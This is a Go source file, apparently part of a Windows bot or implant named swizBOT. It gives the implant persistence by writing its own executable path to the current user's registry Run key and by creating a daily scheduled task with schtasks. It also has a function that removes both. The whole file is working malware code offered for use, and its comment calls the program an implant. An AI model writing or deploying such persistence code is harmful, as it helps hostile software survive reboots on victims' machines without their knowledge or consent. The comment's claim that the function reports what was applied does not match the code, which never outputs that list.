//go:build windows

package main

import (
	"fmt"
	"os"
	"os/exec"

	"golang.org/x/sys/windows/registry"
)

const runKey = `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

// ensurePersistence installs the implant into HKCU Run and a daily
// scheduled task, then reports what was applied.
func ensurePersistence() error {
	exe, err := os.Executable()
	if err != nil {
		return err
	}
	var applied []string

	k, err := registry.OpenKey(registry.CURRENT_USER, runKey, registry.SET_VALUE)
	if err == nil {
		if err := k.SetStringValue("swizBOT", exe); err == nil {
			applied = append(applied, "registry:HKCU Run")
		}
		k.Close()
	}

	if err := exec.Command("schtasks", "/create", "/tn", "swizBOT",
		"/tr", exe, "/sc", "daily", "/st", "09:00", "/f").Run(); err == nil {
		applied = append(applied, "scheduled task swizBOT")
	}

	if len(applied) == 0 {
		return fmt.Errorf("no persistence method could be applied")
	}
	return nil
}

// removePersistence undoes both persistence methods.
func removePersistence() {
	if k, err := registry.OpenKey(registry.CURRENT_USER, runKey, registry.SET_VALUE); err == nil {
		k.DeleteValue("swizBOT")
		k.Close()
	}
	exec.Command("schtasks", "/delete", "/tn", "swizBOT", "/f").Run()
}
